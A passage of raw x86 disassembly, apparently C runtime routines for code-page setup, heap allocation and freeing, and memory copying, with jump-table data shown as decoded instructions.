  425ba0:	stos   DWORD PTR es:[edi],eax
  425ba1:	stos   DWORD PTR es:[edi],eax
  425ba2:	pop    edi
  425ba3:	ret    
  425ba4:	push   ebp
  425ba5:	mov    ebp,esp
  425ba7:	sub    esp,0x518
  425bad:	mov    eax,ds:0x462f30
  425bb2:	xor    eax,DWORD PTR [ebp+0x4]
  425bb5:	push   esi
  425bb6:	mov    DWORD PTR [ebp-0x4],eax
  425bb9:	lea    eax,[ebp-0x18]
  425bbc:	push   eax
  425bbd:	push   DWORD PTR ds:0x463b24
  425bc3:	call   DWORD PTR ds:0x429104
  425bc9:	cmp    eax,0x1
  425bcc:	mov    esi,0x100
  425bd1:	jne    0x425ce4
  425bd7:	xor    eax,eax
  425bd9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425be0:	inc    eax
  425be1:	cmp    eax,esi
  425be3:	jb     0x425bd9
  425be5:	mov    al,BYTE PTR [ebp-0x12]
  425be8:	test   al,al
  425bea:	mov    BYTE PTR [ebp-0x118],0x20
  425bf1:	je     0x425c29
  425bf3:	push   ebx
  425bf4:	lea    edx,[ebp-0x11]
  425bf7:	push   edi
  425bf8:	movzx  ecx,BYTE PTR [edx]
  425bfb:	movzx  eax,al
  425bfe:	cmp    eax,ecx
  425c00:	ja     0x425c1f
  425c02:	sub    ecx,eax
  425c04:	inc    ecx
  425c05:	mov    ebx,ecx
  425c07:	shr    ecx,0x2
  425c0a:	lea    edi,[ebp+eax*1-0x118]
  425c11:	mov    eax,0x20202020
  425c16:	rep stos DWORD PTR es:[edi],eax
  425c18:	mov    ecx,ebx
  425c1a:	and    ecx,0x3
  425c1d:	rep stos BYTE PTR es:[edi],al
  425c1f:	inc    edx
  425c20:	mov    al,BYTE PTR [edx]
  425c22:	inc    edx
  425c23:	test   al,al
  425c25:	jne    0x425bf8
  425c27:	pop    edi
  425c28:	pop    ebx
  425c29:	push   0x0
  425c2b:	push   DWORD PTR ds:0x463a14
  425c31:	lea    eax,[ebp-0x518]
  425c37:	push   DWORD PTR ds:0x463b24
  425c3d:	push   eax
  425c3e:	push   esi
  425c3f:	lea    eax,[ebp-0x118]
  425c45:	push   eax
  425c46:	push   0x1
  425c48:	call   0x427b58
  425c4d:	push   0x0
  425c4f:	push   DWORD PTR ds:0x463b24
  425c55:	lea    eax,[ebp-0x218]
  425c5b:	push   esi
  425c5c:	push   eax
  425c5d:	push   esi
  425c5e:	lea    eax,[ebp-0x118]
  425c64:	push   eax
  425c65:	push   esi
  425c66:	push   DWORD PTR ds:0x463a14
  425c6c:	call   0x42779c
  425c71:	push   0x0
  425c73:	push   DWORD PTR ds:0x463b24
  425c79:	lea    eax,[ebp-0x318]
  425c7f:	push   esi
  425c80:	push   eax
  425c81:	push   esi
  425c82:	lea    eax,[ebp-0x118]
  425c88:	push   eax
  425c89:	push   0x200
  425c8e:	push   DWORD PTR ds:0x463a14
  425c94:	call   0x42779c
  425c99:	add    esp,0x5c
  425c9c:	xor    eax,eax
  425c9e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425ca6:	test   cl,0x1
  425ca9:	je     0x425cc1
  425cab:	or     BYTE PTR [eax+0x463a21],0x10
  425cb2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425cb9:	mov    BYTE PTR [eax+0x463b40],cl
  425cbf:	jmp    0x425cdd
  425cc1:	test   cl,0x2
  425cc4:	je     0x425cd6
  425cc6:	or     BYTE PTR [eax+0x463a21],0x20
  425ccd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425cd4:	jmp    0x425cb9
  425cd6:	and    BYTE PTR [eax+0x463b40],0x0
  425cdd:	inc    eax
  425cde:	cmp    eax,esi
  425ce0:	jb     0x425c9e
  425ce2:	jmp    0x425d28
  425ce4:	xor    eax,eax
  425ce6:	cmp    eax,0x41
  425ce9:	jb     0x425d04
  425ceb:	cmp    eax,0x5a
  425cee:	ja     0x425d04
  425cf0:	or     BYTE PTR [eax+0x463a21],0x10
  425cf7:	mov    cl,al
  425cf9:	add    cl,0x20
  425cfc:	mov    BYTE PTR [eax+0x463b40],cl
  425d02:	jmp    0x425d23
  425d04:	cmp    eax,0x61
  425d07:	jb     0x425d1c
  425d09:	cmp    eax,0x7a
  425d0c:	ja     0x425d1c
  425d0e:	or     BYTE PTR [eax+0x463a21],0x20
  425d15:	mov    cl,al
  425d17:	sub    cl,0x20
  425d1a:	jmp    0x425cfc
  425d1c:	and    BYTE PTR [eax+0x463b40],0x0
  425d23:	inc    eax
  425d24:	cmp    eax,esi
  425d26:	jb     0x425ce6
  425d28:	mov    ecx,DWORD PTR [ebp-0x4]
  425d2b:	xor    ecx,DWORD PTR [ebp+0x4]
  425d2e:	pop    esi
  425d2f:	call   0x425afc
  425d34:	leave  
  425d35:	ret    
  425d36:	push   ebp
  425d37:	mov    ebp,esp
  425d39:	sub    esp,0x1c
  425d3c:	mov    eax,ds:0x462f30
  425d41:	xor    eax,DWORD PTR [ebp+0x4]
  425d44:	push   ebx
  425d45:	push   esi
  425d46:	mov    esi,DWORD PTR [ebp+0x8]
  425d49:	xor    ebx,ebx
  425d4b:	cmp    esi,ebx
  425d4d:	mov    DWORD PTR [ebp-0x4],eax
  425d50:	push   edi
  425d51:	je     0x425eab
  425d57:	xor    edx,edx
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [eax+0x462f40],esi
  425d61:	je     0x425dc8
  425d63:	add    eax,0x30
  425d66:	inc    edx
  425d67:	cmp    eax,0xf0
  425d6c:	jb     0x425d5b
  425d6e:	lea    eax,[ebp-0x1c]
  425d71:	push   eax
  425d72:	push   esi
  425d73:	call   DWORD PTR ds:0x429104
  425d79:	cmp    eax,0x1
  425d7c:	jne    0x425ea3
  425d82:	push   0x40
  425d84:	xor    eax,eax
  425d86:	cmp    DWORD PTR [ebp-0x1c],0x1
  425d8a:	pop    ecx
  425d8b:	mov    edi,0x463a20
  425d90:	rep stos DWORD PTR es:[edi],eax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	mov    DWORD PTR ds:0x463b24,esi
  425d99:	mov    DWORD PTR ds:0x463a14,ebx
  425d9f:	jbe    0x425e91
  425da5:	cmp    BYTE PTR [ebp-0x16],0x0
  425da9:	je     0x425e69
  425daf:	lea    ecx,[ebp-0x15]
  425db2:	mov    dl,BYTE PTR [ecx]
  425db4:	test   dl,dl
  425db6:	je     0x425e69
  425dbc:	movzx  eax,BYTE PTR [ecx-0x1]
  425dc0:	movzx  edx,dl
  425dc3:	jmp    0x425e59
  425dc8:	push   0x40
  425dca:	xor    eax,eax
  425dcc:	pop    ecx
  425dcd:	mov    edi,0x463a20
  425dd2:	rep stos DWORD PTR es:[edi],eax
  425dd4:	lea    ecx,[edx+edx*2]
  425dd7:	shl    ecx,0x4
  425dda:	mov    DWORD PTR [ebp-0x8],ebx
  425ddd:	stos   BYTE PTR es:[edi],al
  425dde:	lea    ebx,[ecx+0x462f50]
  425de4:	mov    al,BYTE PTR [ebx]
  425de6:	mov    esi,ebx
  425de8:	jmp    0x425e13
  425dea:	mov    dl,BYTE PTR [esi+0x1]
  425ded:	test   dl,dl
  425def:	je     0x425e17
  425df1:	movzx  eax,al
  425df4:	movzx  edi,dl
  425df7:	cmp    eax,edi
  425df9:	ja     0x425e0f
  425dfb:	mov    edx,DWORD PTR [ebp-0x8]
  425dfe:	mov    dl,BYTE PTR [edx+0x462f38]
  425e04:	or     BYTE PTR [eax+0x463a21],dl
  425e0a:	inc    eax
  425e0b:	cmp    eax,edi
  425e0d:	jbe    0x425e04
  425e0f:	inc    esi
  425e10:	inc    esi
  425e11:	mov    al,BYTE PTR [esi]
  425e13:	test   al,al
  425e15:	jne    0x425dea
  425e17:	inc    DWORD PTR [ebp-0x8]
  425e1a:	add    ebx,0x8
  425e1d:	cmp    DWORD PTR [ebp-0x8],0x4
  425e21:	jb     0x425de4
  425e23:	mov    eax,DWORD PTR [ebp+0x8]
  425e26:	mov    ds:0x463b24,eax
  425e2b:	mov    DWORD PTR ds:0x463a1c,0x1
  425e35:	call   0x425b4c
  425e3a:	lea    ecx,[ecx+0x462f44]
  425e40:	mov    esi,ecx
  425e42:	mov    edi,0x463b30
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e49:	mov    ds:0x463a14,eax
  425e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4f:	jmp    0x425eb0
  425e51:	or     BYTE PTR [eax+0x463a21],0x4
  425e58:	inc    eax
  425e59:	cmp    eax,edx
  425e5b:	jbe    0x425e51
  425e5d:	inc    ecx
  425e5e:	inc    ecx
  425e5f:	cmp    BYTE PTR [ecx-0x1],0x0
  425e63:	jne    0x425db2
  425e69:	xor    ecx,ecx
  425e6b:	inc    ecx
  425e6c:	mov    eax,ecx
  425e6e:	or     BYTE PTR [eax+0x463a21],0x8
  425e75:	inc    eax
  425e76:	cmp    eax,0xff
  425e7b:	jb     0x425e6e
  425e7d:	mov    eax,esi
  425e7f:	call   0x425b4c
  425e84:	mov    ds:0x463a14,eax
  425e89:	mov    DWORD PTR ds:0x463a1c,ecx
  425e8f:	jmp    0x425e97
  425e91:	mov    DWORD PTR ds:0x463a1c,ebx
  425e97:	xor    eax,eax
  425e99:	mov    edi,0x463b30
  425e9e:	stos   DWORD PTR es:[edi],eax
  425e9f:	stos   DWORD PTR es:[edi],eax
  425ea0:	stos   DWORD PTR es:[edi],eax
  425ea1:	jmp    0x425eb0
  425ea3:	cmp    DWORD PTR ds:0x463884,ebx
  425ea9:	je     0x425eb9
  425eab:	call   0x425b7b
  425eb0:	call   0x425ba4
  425eb5:	xor    eax,eax
  425eb7:	jmp    0x425ebc
  425eb9:	or     eax,0xffffffff
  425ebc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ebf:	xor    ecx,DWORD PTR [ebp+0x4]
  425ec2:	pop    edi
  425ec3:	pop    esi
  425ec4:	pop    ebx
  425ec5:	call   0x425afc
  425eca:	leave  
  425ecb:	ret    
  425ecc:	push   0x14
  425ece:	push   0x4296a8
  425ed3:	call   0x425434
  425ed8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425edc:	push   0xd
  425ede:	call   0x4255ef
  425ee3:	pop    ecx
  425ee4:	xor    edi,edi
  425ee6:	mov    DWORD PTR [ebp-0x4],edi
  425ee9:	mov    DWORD PTR ds:0x463884,edi
  425eef:	mov    eax,DWORD PTR [ebp+0x8]
  425ef2:	cmp    eax,0xfffffffe
  425ef5:	jne    0x425f09
  425ef7:	mov    DWORD PTR ds:0x463884,0x1
  425f01:	call   DWORD PTR ds:0x429100
  425f07:	jmp    0x425f34
  425f09:	cmp    eax,0xfffffffd
  425f0c:	jne    0x425f20
  425f0e:	mov    DWORD PTR ds:0x463884,0x1
  425f18:	call   DWORD PTR ds:0x4290fc
  425f1e:	jmp    0x425f34
  425f20:	cmp    eax,0xfffffffc
  425f23:	jne    0x425f34
  425f25:	mov    DWORD PTR ds:0x463884,0x1
  425f2f:	mov    eax,ds:0x4638b4
  425f34:	mov    DWORD PTR [ebp+0x8],eax
  425f37:	cmp    eax,DWORD PTR ds:0x463b24
  425f3d:	je     0x425ffe
  425f43:	mov    esi,DWORD PTR ds:0x463a18
  425f49:	mov    DWORD PTR [ebp-0x20],esi
  425f4c:	cmp    esi,edi
  425f4e:	je     0x425f54
  425f50:	cmp    DWORD PTR [esi],edi
  425f52:	je     0x425f64
  425f54:	push   0x220
  425f59:	call   0x426152
  425f5e:	pop    ecx
  425f5f:	mov    esi,eax
  425f61:	mov    DWORD PTR [ebp-0x20],esi
  425f64:	cmp    esi,edi
  425f66:	je     0x425fe7
  425f68:	push   DWORD PTR [ebp+0x8]
  425f6b:	call   0x425d36
  425f70:	pop    ecx
  425f71:	mov    DWORD PTR [ebp-0x1c],eax
  425f74:	cmp    eax,edi
  425f76:	jne    0x425fe7
  425f78:	mov    DWORD PTR [esi],edi
  425f7a:	mov    eax,ds:0x463b24
  425f7f:	mov    DWORD PTR [esi+0x4],eax
  425f82:	mov    eax,ds:0x463a1c
  425f87:	mov    DWORD PTR [esi+0x8],eax
  425f8a:	mov    eax,ds:0x463a14
  425f8f:	mov    DWORD PTR [esi+0xc],eax
  425f92:	xor    eax,eax
  425f94:	mov    DWORD PTR [ebp-0x24],eax
  425f97:	cmp    eax,0x5
  425f9a:	jge    0x425fac
  425f9c:	mov    cx,WORD PTR [eax*2+0x463b30]
  425fa4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425fa9:	inc    eax
  425faa:	jmp    0x425f94
  425fac:	xor    eax,eax
  425fae:	mov    DWORD PTR [ebp-0x24],eax
  425fb1:	cmp    eax,0x101
  425fb6:	jge    0x425fc5
  425fb8:	mov    cl,BYTE PTR [eax+0x463a20]
  425fbe:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425fc2:	inc    eax
  425fc3:	jmp    0x425fae
  425fc5:	xor    eax,eax
  425fc7:	mov    DWORD PTR [ebp-0x24],eax
  425fca:	cmp    eax,0x100
  425fcf:	jge    0x425fe1
  425fd1:	mov    cl,BYTE PTR [eax+0x463b40]
  425fd7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425fde:	inc    eax
  425fdf:	jmp    0x425fc7
  425fe1:	mov    DWORD PTR ds:0x463a18,esi
  425fe7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425feb:	jne    0x426001
  425fed:	cmp    esi,DWORD PTR ds:0x463a18
  425ff3:	je     0x426001
  425ff5:	push   esi
  425ff6:	call   0x42603a
  425ffb:	pop    ecx
  425ffc:	jmp    0x426001
  425ffe:	mov    DWORD PTR [ebp-0x1c],edi
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x426013
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	call   0x42546f
  426012:	ret    
  426013:	push   0xd
  426015:	call   0x42555b
  42601a:	pop    ecx
  42601b:	ret    
  42601c:	cmp    DWORD PTR ds:0x463d6c,0x0
  426023:	jne    0x426037
  426025:	push   0xfffffffd
  426027:	call   0x425ecc
  42602c:	pop    ecx
  42602d:	mov    DWORD PTR ds:0x463d6c,0x1
  426037:	xor    eax,eax
  426039:	ret    
  42603a:	push   0xc
  42603c:	push   0x4296b8
  426041:	call   0x425434
  426046:	mov    esi,DWORD PTR [ebp+0x8]
  426049:	test   esi,esi
  42604b:	je     0x4260a5
  42604d:	cmp    DWORD PTR ds:0x463c44,0x3
  426054:	jne    0x426096
  426056:	push   0x4
  426058:	call   0x4255ef
  42605d:	pop    ecx
  42605e:	and    DWORD PTR [ebp-0x4],0x0
  426062:	push   esi
  426063:	call   0x426812
  426068:	pop    ecx
  426069:	mov    DWORD PTR [ebp-0x1c],eax
  42606c:	test   eax,eax
  42606e:	je     0x426079
  426070:	push   esi
  426071:	push   eax
  426072:	call   0x42683d
  426077:	pop    ecx
  426078:	pop    ecx
  426079:	or     DWORD PTR [ebp-0x4],0xffffffff
  42607d:	call   0x42608d
  426082:	cmp    DWORD PTR [ebp-0x1c],0x0
  426086:	jne    0x4260a5
  426088:	push   DWORD PTR [ebp+0x8]
  42608b:	jmp    0x426097
  42608d:	push   0x4
  42608f:	call   0x42555b
  426094:	pop    ecx
  426095:	ret    
  426096:	push   esi
  426097:	push   0x0
  426099:	push   DWORD PTR ds:0x463c40
  42609f:	call   DWORD PTR ds:0x429034
  4260a5:	call   0x42546f
  4260aa:	ret    
  4260ab:	push   0xc
  4260ad:	push   0x4296c8
  4260b2:	call   0x425434
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	cmp    DWORD PTR ds:0x463c44,0x3
  4260c1:	jne    0x4260f1
  4260c3:	cmp    esi,DWORD PTR ds:0x463a04
  4260c9:	ja     0x4260f1
  4260cb:	push   0x4
  4260cd:	call   0x4255ef
  4260d2:	pop    ecx
  4260d3:	and    DWORD PTR [ebp-0x4],0x0
  4260d7:	push   esi
  4260d8:	call   0x426ff1
  4260dd:	pop    ecx
  4260de:	mov    DWORD PTR [ebp-0x1c],eax
  4260e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260e5:	call   0x42611d
  4260ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4260ed:	test   eax,eax
  4260ef:	jne    0x426114
  4260f1:	test   esi,esi
  4260f3:	jne    0x4260f6
  4260f5:	inc    esi
  4260f6:	cmp    DWORD PTR ds:0x463c44,0x1
  4260fd:	je     0x426105
  4260ff:	add    esi,0xf
  426102:	and    esi,0xfffffff0
  426105:	push   esi
  426106:	push   0x0
  426108:	push   DWORD PTR ds:0x463c40
  42610e:	call   DWORD PTR ds:0x429038
  426114:	call   0x42546f
  426119:	ret    
  42611a:	mov    esi,DWORD PTR [ebp+0x8]
  42611d:	push   0x4
  42611f:	call   0x42555b
  426124:	pop    ecx
  426125:	ret    
  426126:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42612b:	ja     0x42614f
  42612d:	push   DWORD PTR [esp+0x4]
  426131:	call   0x4260ab
  426136:	test   eax,eax
  426138:	pop    ecx
  426139:	jne    0x426151
  42613b:	cmp    DWORD PTR [esp+0x8],eax
  42613f:	je     0x426151
  426141:	push   DWORD PTR [esp+0x4]
  426145:	call   0x427d12
  42614a:	test   eax,eax
  42614c:	pop    ecx
  42614d:	jne    0x42612d
  42614f:	xor    eax,eax
  426151:	ret    
  426152:	push   DWORD PTR ds:0x4638c8
  426158:	push   DWORD PTR [esp+0x8]
  42615c:	call   0x426126
  426161:	pop    ecx
  426162:	pop    ecx
  426163:	ret    
  426164:	int3   
  426165:	int3   
  426166:	int3   
  426167:	int3   
  426168:	int3   
  426169:	int3   
  42616a:	int3   
  42616b:	int3   
  42616c:	int3   
  42616d:	int3   
  42616e:	int3   
  42616f:	int3   
  426170:	push   ebp
  426171:	mov    ebp,esp
  426173:	push   edi
  426174:	push   esi
  426175:	mov    esi,DWORD PTR [ebp+0xc]
  426178:	mov    ecx,DWORD PTR [ebp+0x10]
  42617b:	mov    edi,DWORD PTR [ebp+0x8]
  42617e:	mov    eax,ecx
  426180:	mov    edx,ecx
  426182:	add    eax,esi
  426184:	cmp    edi,esi
  426186:	jbe    0x426190
  426188:	cmp    edi,eax
  42618a:	jb     0x42630c
  426190:	test   edi,0x3
  426196:	jne    0x4261ac
  426198:	shr    ecx,0x2
  42619b:	and    edx,0x3
  42619e:	cmp    ecx,0x8
  4261a1:	jb     0x4261cc
  4261a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a5:	jmp    DWORD PTR [edx*4+0x4262bc]
  4261ac:	mov    eax,edi
  4261ae:	mov    edx,0x3
  4261b3:	sub    ecx,0x4
  4261b6:	jb     0x4261c4
  4261b8:	and    eax,0x3
  4261bb:	add    ecx,eax
  4261bd:	jmp    DWORD PTR [eax*4+0x4261d0]
  4261c4:	jmp    DWORD PTR [ecx*4+0x4262cc]
  4261cb:	nop
  4261cc:	jmp    DWORD PTR [ecx*4+0x426250]
  4261d3:	nop
  4261d4:	loopne 0x426237
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],cl
  4261da:	inc    edx
  4261db:	add    BYTE PTR [eax],dh
  4261dd:	bound  eax,QWORD PTR [edx+0x0]
  4261e0:	and    edx,ecx
  4261e2:	mov    al,BYTE PTR [esi]
  4261e4:	mov    BYTE PTR [edi],al
  4261e6:	mov    al,BYTE PTR [esi+0x1]
  4261e9:	mov    BYTE PTR [edi+0x1],al
  4261ec:	mov    al,BYTE PTR [esi+0x2]
  4261ef:	shr    ecx,0x2
  4261f2:	mov    BYTE PTR [edi+0x2],al
  4261f5:	add    esi,0x3
  4261f8:	add    edi,0x3
  4261fb:	cmp    ecx,0x8
  4261fe:	jb     0x4261cc
  426200:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426202:	jmp    DWORD PTR [edx*4+0x4262bc]
  426209:	lea    ecx,[ecx+0x0]
  42620c:	and    edx,ecx
  42620e:	mov    al,BYTE PTR [esi]
  426210:	mov    BYTE PTR [edi],al
  426212:	mov    al,BYTE PTR [esi+0x1]
  426215:	shr    ecx,0x2
  426218:	mov    BYTE PTR [edi+0x1],al
  42621b:	add    esi,0x2
  42621e:	add    edi,0x2
  426221:	cmp    ecx,0x8
  426224:	jb     0x4261cc
  426226:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	jmp    DWORD PTR [edx*4+0x4262bc]
  42622f:	nop
  426230:	and    edx,ecx
  426232:	mov    al,BYTE PTR [esi]
  426234:	mov    BYTE PTR [edi],al
  426236:	add    esi,0x1
  426239:	shr    ecx,0x2
  42623c:	add    edi,0x1
  42623f:	cmp    ecx,0x8
  426242:	jb     0x4261cc
  426244:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426246:	jmp    DWORD PTR [edx*4+0x4262bc]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    bl,0x62
  426252:	inc    edx
  426253:	add    BYTE PTR [eax-0x67ffbd9e],ah
  426259:	bound  eax,QWORD PTR [edx+0x0]
  42625c:	nop
  42625d:	bound  eax,QWORD PTR [edx+0x0]
  426260:	mov    BYTE PTR [edx+0x42],ah
  426263:	add    BYTE PTR [eax+0x78004262],al
  426269:	bound  eax,QWORD PTR [edx+0x0]
  42626c:	jo     0x4262d0
  42626e:	inc    edx
  42626f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426275:	inc    esp
  426276:	(bad)  
  426277:	in     al,0x8b
  426279:	inc    esp
  42627a:	mov    gs,eax
  42627c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426280:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426284:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426288:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42628c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426290:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426294:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426298:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42629c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4262a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4262a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4262a8:	lea    eax,[ecx*4+0x0]
  4262af:	add    esi,eax
  4262b1:	add    edi,eax
  4262b3:	jmp    DWORD PTR [edx*4+0x4262bc]
  4262ba:	mov    edi,edi
  4262bc:	int3   
  4262bd:	bound  eax,QWORD PTR [edx+0x0]
  4262c0:	aam    0x62
  4262c2:	inc    edx
  4262c3:	add    al,ah
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	hlt    
  4262c9:	bound  eax,QWORD PTR [edx+0x0]
  4262cc:	mov    eax,DWORD PTR [ebp+0x8]
  4262cf:	pop    esi
  4262d0:	pop    edi
  4262d1:	leave  
  4262d2:	ret    
  4262d3:	nop
  4262d4:	mov    al,BYTE PTR [esi]
  4262d6:	mov    BYTE PTR [edi],al
  4262d8:	mov    eax,DWORD PTR [ebp+0x8]
  4262db:	pop    esi
  4262dc:	pop    edi
  4262dd:	leave  
  4262de:	ret    
  4262df:	nop
  4262e0:	mov    al,BYTE PTR [esi]
  4262e2:	mov    BYTE PTR [edi],al
  4262e4:	mov    al,BYTE PTR [esi+0x1]
  4262e7:	mov    BYTE PTR [edi+0x1],al
  4262ea:	mov    eax,DWORD PTR [ebp+0x8]
  4262ed:	pop    esi
  4262ee:	pop    edi
  4262ef:	leave  
  4262f0:	ret    
  4262f1:	lea    ecx,[ecx+0x0]
  4262f4:	mov    al,BYTE PTR [esi]
  4262f6:	mov    BYTE PTR [edi],al
  4262f8:	mov    al,BYTE PTR [esi+0x1]
  4262fb:	mov    BYTE PTR [edi+0x1],al
  4262fe:	mov    al,BYTE PTR [esi+0x2]
  426301:	mov    BYTE PTR [edi+0x2],al
  426304:	mov    eax,DWORD PTR [ebp+0x8]
  426307:	pop    esi
  426308:	pop    edi
  426309:	leave  
  42630a:	ret    
  42630b:	nop
  42630c:	lea    esi,[ecx+esi*1-0x4]
  426310:	lea    edi,[ecx+edi*1-0x4]
  426314:	test   edi,0x3
  42631a:	jne    0x426340
  42631c:	shr    ecx,0x2
  42631f:	and    edx,0x3
  426322:	cmp    ecx,0x8
  426325:	jb     0x426334
  426327:	std    
  426328:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	cld    
  42632b:	jmp    DWORD PTR [edx*4+0x426458]
  426332:	mov    edi,edi
  426334:	neg    ecx
  426336:	jmp    DWORD PTR [ecx*4+0x426408]
  42633d:	lea    ecx,[ecx+0x0]
  426340:	mov    eax,edi
  426342:	mov    edx,0x3
  426347:	cmp    ecx,0x4
  42634a:	jb     0x426358
  42634c:	and    eax,0x3
  42634f:	sub    ecx,eax
  426351:	jmp    DWORD PTR [eax*4+0x42635c]
  426358:	jmp    DWORD PTR [ecx*4+0x426458]
  42635f:	nop
  426360:	ins    BYTE PTR es:[edi],dx
  426361:	arpl   WORD PTR [edx+0x0],ax
  426364:	nop
  426365:	arpl   WORD PTR [edx+0x0],ax
  426368:	mov    eax,0x8a004263
  42636d:	inc    esi
  42636e:	add    esp,DWORD PTR [ebx]
  426370:	ror    DWORD PTR [eax-0x117cfcb9],1
  426376:	add    ecx,eax
  426378:	jmp    0x231e67f
  42637d:	cmp    ecx,0x8
  426380:	jb     0x426334
  426382:	std    
  426383:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426385:	cld    
  426386:	jmp    DWORD PTR [edx*4+0x426458]
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	and    edx,ecx
  426395:	mov    BYTE PTR [edi+0x3],al
  426398:	mov    al,BYTE PTR [esi+0x2]
  42639b:	shr    ecx,0x2
  42639e:	mov    BYTE PTR [edi+0x2],al
  4263a1:	sub    esi,0x2
  4263a4:	sub    edi,0x2
  4263a7:	cmp    ecx,0x8
  4263aa:	jb     0x426334
  4263ac:	std    
  4263ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263af:	cld    
  4263b0:	jmp    DWORD PTR [edx*4+0x426458]
  4263b7:	nop
  4263b8:	mov    al,BYTE PTR [esi+0x3]
  4263bb:	and    edx,ecx
  4263bd:	mov    BYTE PTR [edi+0x3],al
  4263c0:	mov    al,BYTE PTR [esi+0x2]
  4263c3:	mov    BYTE PTR [edi+0x2],al
  4263c6:	mov    al,BYTE PTR [esi+0x1]
  4263c9:	shr    ecx,0x2
  4263cc:	mov    BYTE PTR [edi+0x1],al
  4263cf:	sub    esi,0x3
  4263d2:	sub    edi,0x3
  4263d5:	cmp    ecx,0x8
  4263d8:	jb     0x426334
  4263de:	std    
  4263df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e1:	cld    
  4263e2:	jmp    DWORD PTR [edx*4+0x426458]
  4263e9:	lea    ecx,[ecx+0x0]
  4263ec:	or     al,0x64
  4263ee:	inc    edx
  4263ef:	add    BYTE PTR [esp+eiz*2],dl
  4263f2:	inc    edx
  4263f3:	add    BYTE PTR [esp+eiz*2],bl
  4263f6:	inc    edx
  4263f7:	add    BYTE PTR [esp+eiz*2],ah
  4263fa:	inc    edx
  4263fb:	add    BYTE PTR [esp+eiz*2],ch
  4263fe:	inc    edx
  4263ff:	add    BYTE PTR [esp+eiz*2],dh
  426402:	inc    edx
  426403:	add    BYTE PTR [esp+eiz*2],bh
  426406:	inc    edx
  426407:	add    BYTE PTR [edi+0x64],cl
  42640a:	inc    edx
  42640b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426411:	inc    esp
  426412:	(bad)  
  426413:	sbb    al,0x8b
  426415:	inc    esp
  426416:	mov    ds,WORD PTR [eax]
  426418:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42641c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426420:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426424:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426428:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42642c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426430:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426434:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426438:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42643c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426440:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426444:	lea    eax,[ecx*4+0x0]
  42644b:	add    esi,eax
  42644d:	add    edi,eax
  42644f:	jmp    DWORD PTR [edx*4+0x426458]
  426456:	mov    edi,edi
  426458:	push   0x70004264
  42645d:	fs inc edx
  42645f:	add    BYTE PTR [eax-0x6bffbd9c],al
  426465:	fs inc edx
  426467:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42646d:	leave  
  42646e:	ret    
  42646f:	nop
  426470:	mov    al,BYTE PTR [esi+0x3]
  426473:	mov    BYTE PTR [edi+0x3],al
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	pop    esi
  42647a:	pop    edi
  42647b:	leave  
  42647c:	ret    
  42647d:	lea    ecx,[ecx+0x0]
  426480:	mov    al,BYTE PTR [esi+0x3]
  426483:	mov    BYTE PTR [edi+0x3],al
  426486:	mov    al,BYTE PTR [esi+0x2]
  426489:	mov    BYTE PTR [edi+0x2],al
  42648c:	mov    eax,DWORD PTR [ebp+0x8]
  42648f:	pop    esi
  426490:	pop    edi
  426491:	leave  
  426492:	ret    
  426493:	nop
  426494:	mov    al,BYTE PTR [esi+0x3]
